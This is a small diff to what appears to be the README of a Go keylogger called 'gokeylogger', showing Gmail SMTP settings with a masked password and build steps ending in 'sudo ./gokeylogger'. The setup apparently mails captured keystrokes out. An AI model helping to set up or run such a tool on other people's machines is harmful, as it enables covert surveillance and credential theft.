@@ -14,6 +14,7 @@ host_mail = "smtp.gmail.com" # host mail
 pass_mail = "*****" # password mail
 port_mail = 587 # port mail
 ---------------------------------------------------------------------
+$ go get -d ./...
 $ go build
 # run : 
 $ sudo ./gokeylogger
